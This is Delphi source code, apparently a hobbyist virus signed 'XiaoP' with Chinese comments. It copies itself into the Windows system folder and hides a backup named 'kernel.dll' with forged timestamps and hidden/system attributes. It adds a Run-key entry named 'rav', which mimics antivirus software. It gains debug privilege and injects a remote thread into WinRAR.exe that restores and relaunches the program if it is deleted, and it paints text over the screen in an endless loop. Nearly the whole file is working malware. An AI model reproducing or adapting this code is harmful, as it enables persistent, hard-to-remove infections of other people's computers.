unit Main_Pas;

interface

uses
  windows ,SysUtils,psapi;

type
  remoteparameter=^Tremoteparameter;

  Tremoteparameter=record     //声明远线程参数结构
    rpopenprocess:dword;
    rpwaitforsingleobject:dword;
    rpfindfirstfile:dword;
    rpcopyfile:dword;
    rpfindclose:dword;
    rpwinexec:dword;

    rpprocess_remote_Thread:THANDLE;
    rpprocess_hand:THANDLE;
    rpfilehandle:THANDLE;

    rbackupname:array[0..255]of char;
    rpwinexecname:array[0..255]of char;

    rpfdata:WIN32_FIND_DATA;
  end;

const
  MAX_PATH=255;
  procedure MainThread();

  function search_file(path:string):boolean; //查找文件是否存在

  procedure copy_file(E_file,Sub_file:string); //复制文件函数

  procedure create_file(); //打开备份文件并修改属性

  procedure watch_reg_Thread(); //本地线程

  procedure remote_Thread(parm:pointer);//winapi; //远线程

  function Enum_Processes(sub_Processes:string):DWORD;

  procedure Create_remote(remote_pocess_name:string);   //创建远线程过程

  {提升本地进程权限函数}
  function EnabledDebugPrivilege(const bEnabled: Boolean): Boolean;

  procedure display();

implementation
var
  Sysfilename: string;    //系统目录下的本程序
  backupfile: string;
  rp: Tremoteparameter;
  RemoteThread_PID: DWORD; //远线程PID
  RemoteThread_hand:Thandle;

procedure MainThread();
var
  syspath:array[0..MAX_PATH] of char;
  E_if:boolean;
  Thread_hand:Thandle;
  ThreadID:Dword;
begin
   GetSystemDirectory(syspath,MAX_PATH);   //得到系统目录
   backupfile:=strpas(syspath)+'\'+'kernel.dll'; //备份文件
   create_file();
   copy_file(ParamStr(0),backupfile);
   E_if:=search_file(strpas(syspath));
   if E_if then
      begin
                        //已存在此文件就不需要复制了
      end
   else
      begin
        {复制文件到指定目录}
       copy_file(ParamStr(0),Sysfilename);
     end;
    {创建本地线程监控注册表和远线程}
    Create_remote('WinRAR.exe');
    sleep(10);       //这句很重要 保证先创建远线程
    Thread_hand:=CreateThread(nil,0,@watch_reg_Thread,nil,0,ThreadID); //创建本地线程
    display();

end;


function search_file(path:string):boolean;
var
  lpFindFileData: TWIN32FindData;
  ExeName:string;
  str:string;
  Hand:Thandle;
begin
  str:=ParamStr(0);     //获得程序带完整路径名称
  while pos('\',str)<>0 do    //循环--取出应用程序名字
  begin
    str:=copy(str,pos('\',str)+1,length(ParamStr(0)));
  end;
  ExeName:=str;
  {根据返回值判断文件是否存在}
  Sysfilename:=path+'\'+ExeName;
  Hand:=FindFirstFile(pchar(path+'\'+ExeName),lpFindFileData);
  if hand<>INVALID_HANDLE_VALUE   then
  begin
    result:=true;
    // showmessage('OK');
  end
  else
    result:=false;
    //FindClose(Hand);
end;

procedure copy_file(E_file,Sub_file:string);
begin
    CopyFile(pchar(E_file),pchar(Sub_file),TRUE);      //复制文件
end;

  {晕啊，这段函数写了1个多小时才搞定 简直晕---时间格式转换}
procedure create_file();
var
   hand:Thandle;
   Creat_time:TFiletime;    //文件日期时间格式变量
   Last_write_time:TFiletime;
   DosDateTime:Dword;
   date:TDatetime;   //日期时间型变量
begin
    date:=strtodate('2006-3-16'); //字符转换为TDatetime格式
    DosDateTime:= DateTimeToFileDate(date); //将TDatetime转为DOS时间格式--DWORD类型
    {将DOS时间格式转化为文件日期时间格式}
    DosDateTimeToFileTime(LongRec(DosDateTime).Hi,LongRec(DosDateTime).Lo,Creat_time);
    {打开备份文件}
    hand:=CreateFile(pchar

(backupfile),GENERIC_WRITE,FILE_SHARE_WRITE,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
    {设置文件时间}
    SetFileTime(hand,@Creat_time,nil,@Creat_time);
    {设置文件属性-只读、系统、隐藏}
    SetFileAttributes(pchar(backupfile),FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_HIDDEN or

FILE_ATTRIBUTE_SYSTEM );
end;

procedure watch_reg_Thread();
var
   rgspath:string;
   ret:integer;
   mkey:Hkey;
   event_hand:Thandle;
   exitcode:Dword;
begin
     {创建一个永远不会发生的事件}
     event_hand:=CreateEvent(nil,false,false,'Xiaop');
    while true do
     begin
     rgspath:='Software\Microsoft\Windows\CurrentVersion\Run';
     {以查询的方式打开注册表}
     ret:=RegOpenKeyEx(HKEY_LOCAL_MACHINE,pchar(rgspath),0,KEY_QUERY_VALUE,mkey);
     //if ret<>ERROR_SUCCESS then break;
     {查询是否存在相应的的键值   }

     ret:=RegQueryValueEx(mkey,'rav',nil,nil,nil,nil); //这句写的不好^_^
     RegCloseKey(mkey);
     if ret<>ERROR_SUCCESS then
      begin
          RegOpenKeyEx(HKEY_LOCAL_MACHINE,pchar(rgspath),0,KEY_WRITE,mkey);
          RegSetValueEx(mkey,'rav',0,REG_SZ,pchar(Sysfilename),255);
          RegCloseKey(mkey);
      end;
     GetExitCodeThread(RemoteThread_hand,exitcode);   //得到远线程状态
     if exitcode<>STILL_ACTIVE then                 //如果远线程被结束
        Create_remote('love.exe');                            //重新创建远线程
      {等待超时响应---以实现监控}
     WaitforsingleObject(event_hand,2000);
    end;
end;

procedure remote_Thread(parm:pointer);//winapi;   //远线程函数
type
  TEOpenProcess = function (a:DWORD;b:longbool;c: DWORD): THANDLE; //WINAPI;
  TEFindFirstFile= function(name:LPCTSTR;data:WIN32_FIND_DATA):THandle;//WINAPI;
  TEWaitForSingleObject=function(Handle:Thandle;Milliseconds:dword):DWORD;//WINAPI;
  TEFindClose=function(hFindFile:Thandle):boolean;//WINAPI;
  TEWinExec=function(CmdLine:pchar;CmdShow:integer):integer;//WINAPI;
  TECopyFile=function(ExistingFileName:pchar;NewFileName:pchar):boolean; //WINAPI;
var
  erp:remoteparameter;
  EOpenProcess:TEOpenProcess;
  EWaitForSingleObject:TEWaitForSingleObject;
  EFindFirstFile:TEFindFirstFile;
  EFindClose:TEFindClose;
  EWinExec:TEWinExec;
  ECopyFile:TECopyFile;
begin
  erp:=remoteparameter(parm);
  EOpenProcess:=TEOpenProcess(erp.rpopenprocess);
  EWaitForSingleObject:=TEWaitForSingleObject(erp.rpwaitforsingleobject);
  EFindFirstFile:=TEFindFirstFile(erp.rpfindfirstfile);
  EWinExec:=TEWinExec(erp.rpwinexec);
  ECopyFile:=TECopyFile(erp.rpcopyfile);
  EFindClose:=TEFindClose(erp.rpfindclose);

  erp.rpprocess_remote_Thread:=EOpenProcess(PROCESS_ALL_ACCESS,FALSE,erp.rpprocess_hand);
  EWaitForSingleObject(erp.rpprocess_remote_Thread,INFINITE);
  erp.rpfilehandle:=EFindFirstFile(erp.rpwinexecname,erp.rpfdata);
  if erp.rpfilehandle=INVALID_HANDLE_VALUE then
  ECopyFile(erp.rbackupname,erp.rpwinexecname);
  EFindClose(erp.rpfilehandle);
  EWinExec(erp.rpwinexecname,0);
end;
     {枚举所有进程--返回指定进程的PID}
function Enum_Processes(sub_Processes:string):DWord;
var
  szProcessName:array [0..MAX_PATH] of char;
  aProcesses:array [0..1024] of DWORD;
  cbNeeded, cProcesses:DWORD;
  i:integer;
  hand:THandle;
  hMod:HMODULE;
  cmNeeded:DWORD;
begin
  EnumProcesses( @aProcesses, sizeof(aProcesses), cbNeeded );
  cProcesses:=cbNeeded div sizeof(DWORD);
  for i:=1 to cProcesses do
  begin
    hand:=OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ,FALSE,aProcesses[i]);
    if hand<>0 then
    begin
      if EnumProcessModules( hand, @hMod, sizeof(hMod),cmNeeded) then
        GetModuleBaseName(hand,hMod,@szProcessName,sizeof(szProcessName));
      if AnsiCompareStr(sub_Processes,szProcessName)=0 then
      begin
        result:=aProcesses[i];
        break;
      end;
    end;
  end;
end;

procedure   Create_remote(remote_pocess_name:string);
var
  Remote_PID:dWORD;
  hand:Thandle;
  cb:DWord;
  RemoteThread:pointer;
  pRemoteThread:pointer;
  moudel_hand:Thandle;
  s_cb:DWord;
  ReturnCode: Boolean;
  process_hand:Thandle;
  ThreadID:Dword;
begin
  Remote_PID:=Enum_Processes(pchar(remote_pocess_name));
  {提升本地进程为调式级}
  EnabledDebugPrivilege(true);
  hand:=OpenProcess(PROCESS_CREATE_THREAD + PROCESS_VM_OPERATION +
PROCESS_VM_WRITE,FALSE,Remote_PID);
if hand<>0 then
   begin
     rp.rpprocess_hand:= GetCurrentProcessId();
     moudel_hand:=GetModuleHandle('Kernel32');
     rp.rpopenprocess:=dword(GetProcAddress(moudel_hand,'OpenProcess'));
     rp.rpwaitforsingleobject:=Dword(GetProcAddress(moudel_hand,'WaitForSingleObject'));
     rp.rpfindfirstfile:=Dword(GetProcAddress(moudel_hand,'FindFirstFileW'));
     rp.rpcopyfile:=Dword(GetProcAddress(moudel_hand,'CopyFileW'));
     rp.rpfindclose:=Dword(GetProcAddress(moudel_hand,'FindClose'));
     rp.rpwinexec:=Dword(GetProcAddress(moudel_hand,'WinExec'));
     strlcopy(@rp.rbackupname,Pchar(backupfile),length(backupfile));
     strlcopy(@rp.rpwinexecname,Pchar(Sysfilename),length(Sysfilename));
     {以上是在动态获取API函数地址}


     cb:=4*sizeof(rp);
     pRemoteThread:=PWIDESTRING(VirtualAllocEx(hand,nil,cb,MEM_COMMIT,PAGE_EXECUTE_READWRITE));
     {if RemoteThread=nil then showmessage('远进程空间申请失败--参数')
            else showmessage('远进程空间申请成功--参数'); }
     ReturnCode:=WriteProcessMemory(hand, pRemoteThread,pointer(@rp),cb,s_cb);
     {if ReturnCode then   showmessage('向远进程写入数据成功--参数')
           else   showmessage('向远进程写入数据失败--参数');}

     cb:=2*10*1024;
     RemoteThread:=PWIDESTRING((VirtualAllocEx(hand,nil,cb,MEM_COMMIT,PAGE_EXECUTE_READWRITE)));
       {if RemoteThread=nil then showmessage('远进程空间申请失败')
            else showmessage('远进程空间申请成功'); }

     ReturnCode:=WriteProcessMemory(hand,RemoteThread,pointer(@remote_Thread),cb,s_cb);
       {if ReturnCode then   showmessage('向远进程写入数据成功')
           else   showmessage('向远进程写入数据失败'); }

     // CreateThread(nil,0, @remote_Thread,nil,0,ThreadID);//创建的本地线程
     RemoteThread_hand:=CreateRemoteThread(hand,nil,0,TFNThreadStartRoutine(RemoteThread),pRemoteThread,0 , RemoteThread_PID);
      {if   RemoteThread_PID<> 0 then
        begin
         showmessage('创建远线程成功');

        end
     else showmessage('创建远线程失败'); }

    CloseHandle(hand);
  end;
end;


function EnabledDebugPrivilege(const bEnabled: Boolean): Boolean;
var
  hToken: THandle;
  tp: TOKEN_PRIVILEGES;
  a: DWORD;
const
  SE_DEBUG_NAME = 'SeDebugPrivilege';
begin
  Result := False;
  {打开进程令牌设置访问进程权限}
  if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, hToken)) then
  begin
    tp.PrivilegeCount := 1;
    LookupPrivilegeValue(nil, SE_DEBUG_NAME, tp.Privileges[0].Luid);//得到特权属性
    if bEnabled then
      { //将特权类型分配到进程标识
      }
    tp.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED
    else
      {设置默认权限属性}
      tp.Privileges[0].Attributes := 0;
    a := 0;
     {需要有调整令牌特权TOKEN_ADJUST_PRIVILEGES}
    AdjustTokenPrivileges(hToken, False, tp, SizeOf(tp), nil, a);
    Result := GetLastError = ERROR_SUCCESS;
    CloseHandle(hToken);
   end;
end;

procedure display();
var
  hScreenDC: hdc;
  MyOutput1: PChar;
  MyOutput2: PChar;
  MyOutput3: PChar;
  MyOutput4: PChar;
  MyOutput5: PChar;
  event_hand:Thandle;
begin
  hScreenDC := GetDC(0);
  event_hand:=CreateEvent(nil,false,false,'PTZZ');
  MyOutput1:='曾 經 煙 雨 曾 經 虹';
  MyOutput2:='昨 夜 星 辰 昨 夜 風';
  MyOutput3:='遙 看 彩 蝶 雙 雙 飛';
  MyOutput4:='蓦 然 回 首 憶 已 空';
  MyOutput5:= 'By--XiaoP';
  while True do
  begin
    TextOut(hScreenDC, 450, 250, MyOutPut1, lstrlen(MyOutPut1));
    TextOut(hScreenDC, 450, 300, MyOutPut2, lstrlen(MyOutPut2));
    TextOut(hScreenDC, 450, 350, MyOutPut3, lstrlen(MyOutPut3));
    TextOut(hScreenDC, 450, 400, MyOutPut4, lstrlen(MyOutPut4));
    TextOut(hScreenDC, 450, 450, MyOutPut5, lstrlen(MyOutPut5));
    WaitforsingleObject(event_hand,2000);
  end;
  ReleaseDC(0, hScreenDC);
end;

end.

